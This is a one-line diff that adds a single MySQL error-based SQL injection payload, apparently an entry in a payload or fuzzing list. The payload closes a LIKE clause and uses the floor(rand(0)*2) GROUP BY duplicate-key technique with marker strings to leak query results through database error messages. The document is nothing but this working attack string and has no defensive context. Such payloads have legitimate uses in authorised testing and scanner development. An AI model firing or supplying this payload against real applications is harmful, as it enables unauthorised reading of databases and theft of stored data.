@@ -1,0 +1,1 @@
+1%') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('%'='
